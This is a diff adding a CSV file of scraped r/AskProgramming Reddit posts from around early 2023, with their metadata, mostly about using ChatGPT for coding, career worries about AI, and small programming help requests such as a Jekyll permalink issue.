@@ -1,0 +1,794 @@
+comment_limit,comment_sort,selftext,author_fullname,saved,gilded,clicked,title,subreddit_name_prefixed,hidden,pwls,link_flair_css_class,downs,hide_score,name,quarantine,link_flair_text_color,upvote_ratio,subreddit_type,ups,total_awards_received,is_original_content,is_reddit_media_domain,is_meta,link_flair_text,can_mod_post,score,is_created_from_ads_ui,author_premium,thumbnail,edited,post_hint,is_self,created,link_flair_type,wls,author_flair_type,domain,allow_live_comments,selftext_html,archived,no_follow,is_crosspostable,pinned,over_18,media_only,link_flair_template_id,can_gild,spoiler,locked,visited,subreddit_id,author_is_blocked,link_flair_background_color,id,is_robot_indexable,num_comments,send_replies,whitelist_status,contest_mode,author_patreon_flair,permalink,parent_whitelist_status,stickied,url,subreddit_subscribers,created_utc,num_crossposts,is_video,_fetched
+2048,confidence,"Hi, while working on a programming task for my hobby project, I wanted to see whether ChatGPT can help me with writing a function.
+
+After an hour of trying to nudge it in the right direction, I gave up and wrote the function myself (which took me about an hour as well).
+
+I wanted to ask in this subreddit if somebody with more programming and/or chatGPT experience could have formulated the question in a way that would have returned a working code sample.
+
+Please share your attempts, successful or not, in the comments! 
+
+___
+
+The problem:
+
+I have two axis-aligned rectangles.
+I need a function that returns the shortest possible line between those two rectangles.
+
+Visually speaking, I am looking for the blue lines in this picture: https://www.cs.mcgill.ca/~fzamal/Project/maxmin.PNG
+
+___
+
+My attempts:
+
+In the first attempt, I tried describing the problem in words, just like I did in this post. The resulting function worked fine for rectangles that were left/right of each other, but failed for rectangles that were above/below each other. Telling chatGPT that the function didn't work in that case, made it flip the behaviour. After telling it that it needs to work for both cases, the result was wrong in other ways.
+
+In the second attempt I tried providing the mathematical definition of a mindist function between two rectangles from this website https://www.cs.mcgill.ca/~fzamal/Project/concepts.htm which it was able to implement correctly, but when asked to return the resulting line instead of the distance, it failed to convert the variables from the calculation process into a line format with the relevant line, usually returning a transposed line.
+
+In my third attempt I wrote an exhaustive list of inputs and correct outputs, that cover all cases and describe how the function behaves. Still the result never worked for all cases, even after multiple corrections, the behaviour just kept flipping between which special cases it worked for.",t2_24kvozj5,False,0,False,How to make ChatGPT solve this programming task?,r/AskProgramming,False,6,,0,False,t3_112d8q4,False,dark,0.22,public,0,0,False,False,False,Other,False,0,False,False,self,0.0,self,True,1676401331.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>Hi, while working on a programming task for my hobby project, I wanted to see whether ChatGPT can help me with writing a function.</p>
+
+<p>After an hour of trying to nudge it in the right direction, I gave up and wrote the function myself (which took me about an hour as well).</p>
+
+<p>I wanted to ask in this subreddit if somebody with more programming and/or chatGPT experience could have formulated the question in a way that would have returned a working code sample.</p>
+
+<p>Please share your attempts, successful or not, in the comments! </p>
+
+<hr/>
+
+<p>The problem:</p>
+
+<p>I have two axis-aligned rectangles.
+I need a function that returns the shortest possible line between those two rectangles.</p>
+
+<p>Visually speaking, I am looking for the blue lines in this picture: <a href=""https://www.cs.mcgill.ca/%7Efzamal/Project/maxmin.PNG"">https://www.cs.mcgill.ca/~fzamal/Project/maxmin.PNG</a></p>
+
+<hr/>
+
+<p>My attempts:</p>
+
+<p>In the first attempt, I tried describing the problem in words, just like I did in this post. The resulting function worked fine for rectangles that were left/right of each other, but failed for rectangles that were above/below each other. Telling chatGPT that the function didn&#39;t work in that case, made it flip the behaviour. After telling it that it needs to work for both cases, the result was wrong in other ways.</p>
+
+<p>In the second attempt I tried providing the mathematical definition of a mindist function between two rectangles from this website <a href=""https://www.cs.mcgill.ca/%7Efzamal/Project/concepts.htm"">https://www.cs.mcgill.ca/~fzamal/Project/concepts.htm</a> which it was able to implement correctly, but when asked to return the resulting line instead of the distance, it failed to convert the variables from the calculation process into a line format with the relevant line, usually returning a transposed line.</p>
+
+<p>In my third attempt I wrote an exhaustive list of inputs and correct outputs, that cover all cases and describe how the function behaves. Still the result never worked for all cases, even after multiple corrections, the behaviour just kept flipping between which special cases it worked for.</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,608ebc8a-356a-11ec-81a1-c205767038e0,False,False,False,False,t5_2seko,False,,112d8q4,True,5,True,all_ads,False,False,/r/AskProgramming/comments/112d8q4/how_to_make_chatgpt_solve_this_programming_task/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/112d8q4/how_to_make_chatgpt_solve_this_programming_task/,93779,1676401331.0,0,False,False
+2048,confidence,"I don’t know that much about programming but while looking at the OpenAI website I thought you should be able to somehow combine Whisper (for Speech Input) and ChatGPT (for Questions). I guess you would need a TTS Service(?) if you want voice output and maybe do some additional Programming so you can control your Smarthome.
+Idk if this is Possible but I just got curious.",t2_vrf7erl6,False,0,False,Is it possible to Combine Whisper and ChatGPT (both OpenAI) to a Perfect Voice Assistant?,r/AskProgramming,False,6,,0,False,t3_10qpn15,False,dark,0.6,public,1,0,False,False,False,,False,1,False,False,self,0.0,,True,1675245369.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>I don’t know that much about programming but while looking at the OpenAI website I thought you should be able to somehow combine Whisper (for Speech Input) and ChatGPT (for Questions). I guess you would need a TTS Service(?) if you want voice output and maybe do some additional Programming so you can control your Smarthome.
+Idk if this is Possible but I just got curious.</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,,False,False,False,False,t5_2seko,False,,10qpn15,True,3,True,all_ads,False,False,/r/AskProgramming/comments/10qpn15/is_it_possible_to_combine_whisper_and_chatgpt/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/10qpn15/is_it_possible_to_combine_whisper_and_chatgpt/,93779,1675245369.0,0,False,False
+2048,confidence,"Hi guys, I just started the university, and I feel like since ChatGPT got announced, I started loosing motivation. To tell you the truth, it can almost solve all of our exercises in a couple of seconds. I feel like that what I'm learning is not useful, because I can only see that AI is better than us students. What do you guys think about it? Thanks for the advice",t2_3sffekor,False,0,False,Losing Motivation because of ChatGPT,r/AskProgramming,False,6,,0,False,t3_zvxjnj,False,dark,0.38,public,0,0,False,False,False,Career/Edu,False,0,False,False,self,0.0,,True,1672090423.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>Hi guys, I just started the university, and I feel like since ChatGPT got announced, I started loosing motivation. To tell you the truth, it can almost solve all of our exercises in a couple of seconds. I feel like that what I&#39;m learning is not useful, because I can only see that AI is better than us students. What do you guys think about it? Thanks for the advice</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,17095c1e-cc05-11e2-9f3d-12313d2c1c24,False,False,False,False,t5_2seko,False,,zvxjnj,True,16,True,all_ads,False,False,/r/AskProgramming/comments/zvxjnj/losing_motivation_because_of_chatgpt/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/zvxjnj/losing_motivation_because_of_chatgpt/,93779,1672090423.0,0,False,False
+2048,confidence,Could it run on an expensive laptop? A cheap laptop? A cell phone?,t2_u1ac,False,0,False,How beefy of a computer would you need to run a single-user ChatGPT node?,r/AskProgramming,False,6,,0,False,t3_zfj20h,False,dark,0.91,public,18,0,False,False,False,,False,18,False,False,self,0.0,,True,1670458660.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>Could it run on an expensive laptop? A cheap laptop? A cell phone?</p>
+</div><!-- SC_ON -->",False,False,False,False,False,False,,False,False,False,False,t5_2seko,False,,zfj20h,True,15,True,all_ads,False,False,/r/AskProgramming/comments/zfj20h/how_beefy_of_a_computer_would_you_need_to_run_a/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/zfj20h/how_beefy_of_a_computer_would_you_need_to_run_a/,93779,1670458660.0,0,False,False
+2048,confidence,"Hi guys,
+I am well aware that AI won’t replace high quality programmers, but I see the learning potential. I am woundering what is the core difference between these two technologies?",t2_51letxco,False,0,False,ChatGPT vs Github Copilot,r/AskProgramming,False,6,,0,False,t3_zg7cn7,False,dark,0.94,public,26,0,False,False,False,Other,False,26,False,False,self,0.0,,True,1670524793.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>Hi guys,
+I am well aware that AI won’t replace high quality programmers, but I see the learning potential. I am woundering what is the core difference between these two technologies?</p>
+</div><!-- SC_ON -->",False,False,False,False,False,False,608ebc8a-356a-11ec-81a1-c205767038e0,False,False,False,False,t5_2seko,False,,zg7cn7,True,11,True,all_ads,False,False,/r/AskProgramming/comments/zg7cn7/chatgpt_vs_github_copilot/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/zg7cn7/chatgpt_vs_github_copilot/,93779,1670524793.0,0,False,False
+2048,confidence,"If in 2022 I can tell it “make me a game in C# that does X” and it does it pretty well.
+
+How many years are we from “make me an app with React & Spring that does X, Y, and Z”?",t2_5baii,False,0,False,Anyone else afraid of what ChatGPT’s ability to write code means for our industry?,r/AskProgramming,False,6,,0,False,t3_znta26,False,dark,0.49,public,0,0,False,False,False,Other,False,0,False,False,self,0.0,,True,1671235965.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>If in 2022 I can tell it “make me a game in C# that does X” and it does it pretty well.</p>
+
+<p>How many years are we from “make me an app with React &amp; Spring that does X, Y, and Z”?</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,608ebc8a-356a-11ec-81a1-c205767038e0,False,False,False,False,t5_2seko,False,,znta26,True,32,True,all_ads,False,False,/r/AskProgramming/comments/znta26/anyone_else_afraid_of_what_chatgpts_ability_to/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/znta26/anyone_else_afraid_of_what_chatgpts_ability_to/,93779,1671235965.0,0,False,False
+2048,confidence,"This code isn't technically ""executed"", correct? No python interpreter involved at all. It's purely based on the language model!?
+
+https://imgur.com/a/xcBjdJP",t2_8c0hx,False,0,False,"ChatGPT: This is not ""executing"" the code, correct?",r/AskProgramming,False,6,,0,False,t3_zpnbvv,False,dark,0.72,public,6,0,False,False,False,,False,6,False,False,self,0.0,,True,1671443241.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>This code isn&#39;t technically &quot;executed&quot;, correct? No python interpreter involved at all. It&#39;s purely based on the language model!?</p>
+
+<p><a href=""https://imgur.com/a/xcBjdJP"">https://imgur.com/a/xcBjdJP</a></p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,,False,False,False,False,t5_2seko,False,,zpnbvv,True,7,True,all_ads,False,False,/r/AskProgramming/comments/zpnbvv/chatgpt_this_is_not_executing_the_code_correct/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/zpnbvv/chatgpt_this_is_not_executing_the_code_correct/,93779,1671443241.0,0,False,False
+2048,confidence,anyone know ChatGPT? I've devised a way to translate the AI's image thoughts through deciphering simple values converting it to pixel images or pixel art... anyone interested in building an app that converts this values to pixel art?,t2_snsazd63,False,0,False,A way to translate ChatGPT's AI's image thought to pixel art...,r/AskProgramming,False,6,,0,False,t3_1086kb6,False,dark,0.2,public,0,0,False,False,False,,False,0,False,False,self,0.0,,True,1673346503.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>anyone know ChatGPT? I&#39;ve devised a way to translate the AI&#39;s image thoughts through deciphering simple values converting it to pixel images or pixel art... anyone interested in building an app that converts this values to pixel art?</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,,False,False,False,False,t5_2seko,False,,1086kb6,True,3,True,all_ads,False,False,/r/AskProgramming/comments/1086kb6/a_way_to_translate_chatgpts_ais_image_thought_to/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/1086kb6/a_way_to_translate_chatgpts_ais_image_thought_to/,93779,1673346503.0,0,False,False
+2048,confidence,I've been seeing news regarding AI powered apps that can write code for you in real time. Also the introduction of apps like ChatGPT means that there is a future possibility that AI will be able to create entire apps. I am currently in high school and want to pursue software development but I wonder that will the introduction of such AI reduce the demand for programmers in the market.,t2_cbysgvnn,False,0,False,Is a career in programming safe?,r/AskProgramming,False,6,,0,False,t3_10zd4fx,False,dark,0.61,public,3,0,False,False,False,,False,3,False,False,self,0.0,,True,1676092994.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>I&#39;ve been seeing news regarding AI powered apps that can write code for you in real time. Also the introduction of apps like ChatGPT means that there is a future possibility that AI will be able to create entire apps. I am currently in high school and want to pursue software development but I wonder that will the introduction of such AI reduce the demand for programmers in the market.</p>
+</div><!-- SC_ON -->",False,False,False,False,False,False,,False,False,False,False,t5_2seko,False,,10zd4fx,True,15,True,all_ads,False,False,/r/AskProgramming/comments/10zd4fx/is_a_career_in_programming_safe/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/10zd4fx/is_a_career_in_programming_safe/,93779,1676092994.0,0,False,False
+2048,confidence,"I'm studying assembly language at the university, and I came across an exercise, so I went to ChatGPT and told it to generate PEP/8 code for the exercise; it generated a totally different syntax, then I said to it, ""This is not PEP/8 language,"" so he generated another code with a different syntax.
+
+So, are there different syntaxes in PEP/8 assembly?",t2_ojb3oyf,False,0,False,[ASSEMBLY] Does pep/8 have different languages/syntaxes?,r/AskProgramming,False,6,,0,False,t3_112rnot,False,dark,0.43,public,0,0,False,False,False,Other,False,0,False,True,self,0.0,,True,1676443497.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>I&#39;m studying assembly language at the university, and I came across an exercise, so I went to ChatGPT and told it to generate PEP/8 code for the exercise; it generated a totally different syntax, then I said to it, &quot;This is not PEP/8 language,&quot; so he generated another code with a different syntax.</p>
+
+<p>So, are there different syntaxes in PEP/8 assembly?</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,608ebc8a-356a-11ec-81a1-c205767038e0,False,False,False,False,t5_2seko,False,,112rnot,True,12,True,all_ads,False,False,/r/AskProgramming/comments/112rnot/assembly_does_pep8_have_different/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/112rnot/assembly_does_pep8_have_different/,93779,1676443497.0,0,False,False
+2048,confidence,"I want to learn how to get information from websites requesting and getting information from an API. I want to store, sort and analyse the data.
+This is very complex when the only background I have is entry level arduino and 25 years surfing the internet. I use ChatGPT to tell me what to do and explain consept I need to learn. This leads me often to more and smaller consept. 
+
+Would like to document this path with notes ""connected"" by similarity and/or subconnection. I am taking any suggestion.",t2_6bir5a58,False,0,False,"I am new to programming and have a goal. What tool should I use to sort problems I need to solve, consepts I need to learn, list of subgoals. Would be nice if it could be structured like a tree of notes, with my final goal being the trunk. While the work, learning and subgoals being the branches.",r/AskProgramming,False,6,,0,False,t3_10ts21m,False,dark,0.67,public,1,0,False,False,False,Other,False,1,False,False,self,0.0,,True,1675546701.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>I want to learn how to get information from websites requesting and getting information from an API. I want to store, sort and analyse the data.
+This is very complex when the only background I have is entry level arduino and 25 years surfing the internet. I use ChatGPT to tell me what to do and explain consept I need to learn. This leads me often to more and smaller consept. </p>
+
+<p>Would like to document this path with notes &quot;connected&quot; by similarity and/or subconnection. I am taking any suggestion.</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,608ebc8a-356a-11ec-81a1-c205767038e0,False,False,False,False,t5_2seko,False,,10ts21m,True,9,True,all_ads,False,False,/r/AskProgramming/comments/10ts21m/i_am_new_to_programming_and_have_a_goal_what_tool/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/10ts21m/i_am_new_to_programming_and_have_a_goal_what_tool/,93779,1675546701.0,0,False,False
+2048,confidence,I want to make a C++ application that uses HTML for the GUI. I can't find any tutorials and the documentation is really bad. Using ChatGPT gave me a non working example.,t2_qz11rjm2,False,0,False,Loading a HTML file in CEF C++,r/AskProgramming,False,6,,0,False,t3_zqy150,False,dark,0.5,public,0,0,False,False,False,C/C++,False,0,False,False,self,0.0,,True,1671566415.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>I want to make a C++ application that uses HTML for the GUI. I can&#39;t find any tutorials and the documentation is really bad. Using ChatGPT gave me a non working example.</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,1b3ca6a6-356a-11ec-95f4-d6d6f260a736,False,False,False,False,t5_2seko,False,,zqy150,True,5,True,all_ads,False,False,/r/AskProgramming/comments/zqy150/loading_a_html_file_in_cef_c/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/zqy150/loading_a_html_file_in_cef_c/,93779,1671566415.0,0,False,False
+2048,confidence,"Hey, coders! Quick Q. If you were going to make a windows app that allows users to chat with an AI-powered 3D model, where would you start? Would you use a game engine or go in raw with OpenGL? I plan on incorporating the ChatGPT API and Nvidia Audio2Face eventually, but don't know where to start with rendering 3D animations in a Windows app.",t2_2ntnj3dm,False,0,False,3D rendering app from scratch?,r/AskProgramming,False,6,,0,False,t3_zm27iw,False,dark,0.67,public,1,0,False,False,False,Other,False,1,False,False,self,0.0,,True,1671051969.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>Hey, coders! Quick Q. If you were going to make a windows app that allows users to chat with an AI-powered 3D model, where would you start? Would you use a game engine or go in raw with OpenGL? I plan on incorporating the ChatGPT API and Nvidia Audio2Face eventually, but don&#39;t know where to start with rendering 3D animations in a Windows app.</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,608ebc8a-356a-11ec-81a1-c205767038e0,False,False,False,False,t5_2seko,False,,zm27iw,True,2,True,all_ads,False,False,/r/AskProgramming/comments/zm27iw/3d_rendering_app_from_scratch/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/zm27iw/3d_rendering_app_from_scratch/,93779,1671051969.0,0,False,False
+2048,confidence,For some reason I need to do something in Erlang. I’ve never used Erlang before. I have some simple functions in Python. What tools are out there that will do the translation for me? I guess one option might be to try ChatGPT. Do people have any other ideas?,t2_1x23d82m,False,0,False,What’s the fastest way to translate some Python functions into Erlang?,r/AskProgramming,False,6,,0,False,t3_10tave8,False,dark,1.0,public,2,0,False,False,False,,False,2,False,False,self,0.0,,True,1675501727.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>For some reason I need to do something in Erlang. I’ve never used Erlang before. I have some simple functions in Python. What tools are out there that will do the translation for me? I guess one option might be to try ChatGPT. Do people have any other ideas?</p>
+</div><!-- SC_ON -->",False,False,False,False,False,False,,False,False,False,False,t5_2seko,False,,10tave8,True,3,True,all_ads,False,False,/r/AskProgramming/comments/10tave8/whats_the_fastest_way_to_translate_some_python/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/10tave8/whats_the_fastest_way_to_translate_some_python/,93779,1675501727.0,0,False,False
+2048,confidence,"I was wondering if someone could help me with a Jekyll theme issue. \*\*This is for the Minima theme.\*\*
+
+I recently just set up a GitHub Pages. Hooray! This is very exciting for me.
+
+I've been having endless issues with inserting the baseurl for the ""post"" layout; not for anything else (e.g. default, page). I have no idea why.
+
+Here's the setup:
+
+    url: ""https://[user].github.io"" # the base hostname & protocol for your site, e.g. http://example.com # this means to ignore newlines until ""baseurl:"" 
+    baseurl: ""/portfolio"" # the subpath of your site, e.g. /blog  
+
+For ""page"" layout, I have the following:
+
+    --- 
+    layout: page 
+    title: About 
+    permalink: /about 
+    ---  
+    
+    # About page  This page tells you a little bit about me.  
+
+No issue - https://\[user\].github.io/portfolio/about
+
+With a post, however, I've coded the following:
+
+    --- 
+    layout: post 
+    title:  ""Space Race Project"" 
+    date:   2023-02-11 17:09:05 -0500 
+    categories: excel 
+    permalink: /:categories/:title/ 
+    ---  
+
+And the result - http://\[user\].github.io/python/pet-sales/
+
+Why is it excluding the baseurl, ""portfolio?"" It leads to a 404 error.
+
+Any help would be so appreciated.
+
+\*\*ChatGPT recommends I add {{ site.baseurl }} to the pemalink, but that just removes the post from index.html (the landing page), and I get a 404 error when manually entering the post URL.
+
+Jekyll is great. I really love it. However, it's not a company, so there's no customer service! (I actually know the person who helped design it, so I think it's mostly grassroots work nowadays.)
+
+Edit: Edited to make code more readable (and not inline).",t2_21ez3rh7,False,0,False,Having trouble with post permalink on Minima theme,r/AskProgramming,False,6,,0,False,t3_113yus0,False,dark,1.0,public,1,0,False,False,False,,False,1,False,False,self,0.0,,True,1676575792.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>I was wondering if someone could help me with a Jekyll theme issue. **This is for the Minima theme.**</p>
+
+<p>I recently just set up a GitHub Pages. Hooray! This is very exciting for me.</p>
+
+<p>I&#39;ve been having endless issues with inserting the baseurl for the &quot;post&quot; layout; not for anything else (e.g. default, page). I have no idea why.</p>
+
+<p>Here&#39;s the setup:</p>
+
+<pre><code>url: &quot;https://[user].github.io&quot; # the base hostname &amp; protocol for your site, e.g. http://example.com # this means to ignore newlines until &quot;baseurl:&quot; 
+baseurl: &quot;/portfolio&quot; # the subpath of your site, e.g. /blog  
+</code></pre>
+
+<p>For &quot;page&quot; layout, I have the following:</p>
+
+<pre><code>--- 
+layout: page 
+title: About 
+permalink: /about 
+---  
+
+# About page  This page tells you a little bit about me.  
+</code></pre>
+
+<p>No issue - https://[user].github.io/portfolio/about</p>
+
+<p>With a post, however, I&#39;ve coded the following:</p>
+
+<pre><code>--- 
+layout: post 
+title:  &quot;Space Race Project&quot; 
+date:   2023-02-11 17:09:05 -0500 
+categories: excel 
+permalink: /:categories/:title/ 
+---  
+</code></pre>
+
+<p>And the result - http://[user].github.io/python/pet-sales/</p>
+
+<p>Why is it excluding the baseurl, &quot;portfolio?&quot; It leads to a 404 error.</p>
+
+<p>Any help would be so appreciated.</p>
+
+<p>**ChatGPT recommends I add {{ site.baseurl }} to the pemalink, but that just removes the post from index.html (the landing page), and I get a 404 error when manually entering the post URL.</p>
+
+<p>Jekyll is great. I really love it. However, it&#39;s not a company, so there&#39;s no customer service! (I actually know the person who helped design it, so I think it&#39;s mostly grassroots work nowadays.)</p>
+
+<p>Edit: Edited to make code more readable (and not inline).</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,,False,False,False,False,t5_2seko,False,,113yus0,True,0,True,all_ads,False,False,/r/AskProgramming/comments/113yus0/having_trouble_with_post_permalink_on_minima_theme/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/113yus0/having_trouble_with_post_permalink_on_minima_theme/,93779,1676575792.0,0,False,False
+2048,confidence," Good day everyone!
+
+&#x200B;
+
+This post has been removed by admins in Webdev... Not sure why, if you know or understand why, please let me know. 
+
+I know HTML / CSS kinda well but Javascript experience is kinda very poor and I am not a great programmer BUT I like to learn new stuff and I finally have a project I'd like to cherish for many years to come and maintain it myself.
+
+Basically I want to create a website with a database and I want to let users filter the database themselves on the website and add more information themselves on the site and this new information they put in can also be filtered and searched by other members.
+
+Now the question since web dev is evolving so quickly in the recent years I don't really know where to start and which programming language / database structure would be preferable?
+
+I want to have my hands dirty, time is not an issue and I can take the time to learn stuff instead of using a software that will do it all for me. 
+
+According to Chat GPT here are the recommendations but since I do not have a lot of experience with these framework, I need assistance to know which one should I start with. Not sure which one is best for me and what you guys recommend and why?
+
+* Ruby on Rails: a framework written in the Ruby programming language, known for its ability to create complex web applications quickly.
+* Laravel: a PHP framework that includes an ORM (Object Relational Mapper) for database management, as well as an easy-to-use authentication system.
+* Django: a Python framework that follows the Model-View-Template architectural pattern and includes a powerful ORM for database management.
+* Node.js with Express: a JavaScript-based framework for building web applications, often used in  
+conjunction with a NoSQL database like MongoDB.  
+
+* any other options that you think is better not shown in the list",t2_cje6zyze,False,0,False,Need help to decide which path to go,r/AskProgramming,False,6,,0,False,t3_10vcwra,False,dark,1.0,public,1,0,False,False,False,,False,1,False,False,self,0.0,,True,1675705603.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>Good day everyone!</p>
+
+<p>&#x200B;</p>
+
+<p>This post has been removed by admins in Webdev... Not sure why, if you know or understand why, please let me know. </p>
+
+<p>I know HTML / CSS kinda well but Javascript experience is kinda very poor and I am not a great programmer BUT I like to learn new stuff and I finally have a project I&#39;d like to cherish for many years to come and maintain it myself.</p>
+
+<p>Basically I want to create a website with a database and I want to let users filter the database themselves on the website and add more information themselves on the site and this new information they put in can also be filtered and searched by other members.</p>
+
+<p>Now the question since web dev is evolving so quickly in the recent years I don&#39;t really know where to start and which programming language / database structure would be preferable?</p>
+
+<p>I want to have my hands dirty, time is not an issue and I can take the time to learn stuff instead of using a software that will do it all for me. </p>
+
+<p>According to Chat GPT here are the recommendations but since I do not have a lot of experience with these framework, I need assistance to know which one should I start with. Not sure which one is best for me and what you guys recommend and why?</p>
+
+<ul>
+<li>Ruby on Rails: a framework written in the Ruby programming language, known for its ability to create complex web applications quickly.</li>
+<li>Laravel: a PHP framework that includes an ORM (Object Relational Mapper) for database management, as well as an easy-to-use authentication system.</li>
+<li>Django: a Python framework that follows the Model-View-Template architectural pattern and includes a powerful ORM for database management.</li>
+<li><p>Node.js with Express: a JavaScript-based framework for building web applications, often used in<br/>
+conjunction with a NoSQL database like MongoDB.  </p></li>
+<li><p>any other options that you think is better not shown in the list</p></li>
+</ul>
+</div><!-- SC_ON -->",False,True,False,False,False,False,,False,False,False,False,t5_2seko,False,,10vcwra,True,2,True,all_ads,False,False,/r/AskProgramming/comments/10vcwra/need_help_to_decide_which_path_to_go/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/10vcwra/need_help_to_decide_which_path_to_go/,93779,1675705603.0,0,False,False
+2048,confidence,"I'm interested in this [desktop version](https://github.com/lencx/ChatGPT) of ChatGPT. I understand that nothing is 100% safe to download from the internet. I don't have the expertise to look at the code files and discern if it contains malicious or privacy-breaking contents. I see that it has been ""starred"" and ""forked"" thousands of times. And it looks like it has a number of active contributors to the project. Would that be enough to feel safe about downloading this program? How else can I verify that this program is safe to use on my personal machine? Thanks in advance",t2_dqcszakp,False,0,False,Would you consider this a safe program to install from GitHub?,r/AskProgramming,False,6,,0,False,t3_10ggrxx,False,dark,0.33,public,0,0,False,False,False,Other,False,0,False,False,self,0.0,self,True,1674171031.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>I&#39;m interested in this <a href=""https://github.com/lencx/ChatGPT"">desktop version</a> of ChatGPT. I understand that nothing is 100% safe to download from the internet. I don&#39;t have the expertise to look at the code files and discern if it contains malicious or privacy-breaking contents. I see that it has been &quot;starred&quot; and &quot;forked&quot; thousands of times. And it looks like it has a number of active contributors to the project. Would that be enough to feel safe about downloading this program? How else can I verify that this program is safe to use on my personal machine? Thanks in advance</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,608ebc8a-356a-11ec-81a1-c205767038e0,False,False,False,False,t5_2seko,False,,10ggrxx,True,3,True,all_ads,False,False,/r/AskProgramming/comments/10ggrxx/would_you_consider_this_a_safe_program_to_install/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/10ggrxx/would_you_consider_this_a_safe_program_to_install/,93779,1674171031.0,0,False,False
+2048,confidence,"Asking this question obviously because of the up rise of chatgpt, GitHub copilot and all those deepfake faceswap shenanigans. I’m a c# developer most of my expertise lies at Unity C# and a little of type script for firebase and any server related work but due to the hype of the AI and machine learning I’m feeling kind of outdated. I’m looking forward for any suggestions and insights that would be useful.",t2_4x2nh6zf,False,0,False,Do you guys think it’s the time every programmer should start learning AI ?,r/AskProgramming,False,6,,0,False,t3_11ameyx,False,dark,0.56,public,1,0,False,False,False,Algorithms,False,1,False,False,self,0.0,,True,1677227173.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>Asking this question obviously because of the up rise of chatgpt, GitHub copilot and all those deepfake faceswap shenanigans. I’m a c# developer most of my expertise lies at Unity C# and a little of type script for firebase and any server related work but due to the hype of the AI and machine learning I’m feeling kind of outdated. I’m looking forward for any suggestions and insights that would be useful.</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,e85c56be-4a18-11e2-8fc6-12313b088941,False,False,False,False,t5_2seko,False,,11ameyx,True,19,True,all_ads,False,False,/r/AskProgramming/comments/11ameyx/do_you_guys_think_its_the_time_every_programmer/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/11ameyx/do_you_guys_think_its_the_time_every_programmer/,93779,1677227173.0,0,False,False
+2048,confidence,"Challenge
+
+Write an aplication that reads from stdin a set of words, one word per line
+
+It outputs to stdout a sequence of words, where the first letter of the next word in the sequence is equal to the last letter of the word before
+
+Example
+
+Input:
+
+apple
+
+banana
+
+cherry
+
+date
+
+pear
+
+Output:
+
+banana
+
+apple
+
+&#x200B;
+
+Rules
+
+The program must receive a list of words from standard input, one word per line.
+
+It should return the longest sequence of words, where the next word in the sequence starts with the last letter of the previous word.
+
+There cannot be repeated words in the sequence. Also no repeated words in the input
+
+The string must be returned to standard output, one word per line.
+
+The program must know how to deal with uppercase/lowercase letters. Uppercase letters are the same as lowercase letters.
+
+The program cannot use either libraries or external services.
+
+The program must be written in Java, C or Python.
+
+I have tried using chatgpt but it keeps giving me wrong outputs for harder tests.
+
+Edit: Provided 4 tests in the comments
+
+Edit2: Forgot to say  there's only 30 seconds to execute and a limit of 150Mb of memory to use
+
+&#x200B;",t2_14fljzd0,False,0,False,Coding Challenge going around in my university,r/AskProgramming,False,6,,0,False,t3_11ekdp2,False,dark,1.0,public,1,0,False,False,False,,False,1,False,False,self,1677619937.0,,True,1677619397.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>Challenge</p>
+
+<p>Write an aplication that reads from stdin a set of words, one word per line</p>
+
+<p>It outputs to stdout a sequence of words, where the first letter of the next word in the sequence is equal to the last letter of the word before</p>
+
+<p>Example</p>
+
+<p>Input:</p>
+
+<p>apple</p>
+
+<p>banana</p>
+
+<p>cherry</p>
+
+<p>date</p>
+
+<p>pear</p>
+
+<p>Output:</p>
+
+<p>banana</p>
+
+<p>apple</p>
+
+<p>&#x200B;</p>
+
+<p>Rules</p>
+
